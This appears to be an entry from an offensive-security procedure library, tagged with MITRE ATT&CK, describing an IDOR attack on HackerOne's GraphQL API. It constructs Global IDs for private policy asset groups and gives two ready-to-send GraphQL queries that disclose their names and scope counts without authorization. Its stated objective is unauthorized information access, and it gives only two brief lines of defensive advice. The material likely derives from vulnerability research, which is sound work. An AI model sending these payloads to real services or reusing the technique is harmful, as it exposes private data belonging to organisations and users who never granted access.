---
tags:
  - idor
  - graphql
  - exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/graphql-query-asset-group-name]]'
  - '[[commands/graphql-query-asset-group-details]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 90e4c181-a6c6-44ac-9e0c-b805cbc69ebf
created_at: '2025-12-11T03:48:05.933Z'
updated_at: '2025-12-11T03:48:05.933Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1213]]'
---
# Construct GID and Query Private Asset Groups

## Summary

This procedure constructs Global IDs using enumerated parts and queries the GraphQL endpoint to disclose private asset group details without authorization.

## Description

Combine PolicyPageAssetGroup ID and program ID into a GID format (e.g., gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287) and send queries to fetch sensitive data like names and scope counts. Uses tools like Burp Suite for request interception.

## Requirements

1. Enumerated program and asset group IDs
2. Access to /graphql endpoint
3. HTTP client or proxy tool

## Defense

Defensive measures and detection strategies:

- Validate authorization for all node queries
- Obfuscate or randomize GIDs

## Objectives

1. Disclose private program asset names
2. Retrieve scope counts and details
3. Achieve unauthorized information access

## Instructions

### Step 1: Query Asset Group Name

**Context**: Fetch basic id and name of the private asset group.

**Command** ([[commands/graphql-query-asset-group-name]]):
```json
{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}
```

> This queries the node for id and name; expect JSON with private data.

### Step 2: Query Detailed Scope Information

**Context**: Extend to include scope counts.

**Command** ([[commands/graphql-query-asset-group-details]]):
```json
{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name,in_scope_count,out_of_scope_count,structured_scopes_count}}}"}
```

> This retrieves detailed counts; validate for successful disclosure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### Sub-Techniques



## Commands Used

- [[commands/graphql-query-asset-group-name]]
- [[commands/graphql-query-asset-group-details]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- #idor
- [[commands/graphql-enumerate-programs]]
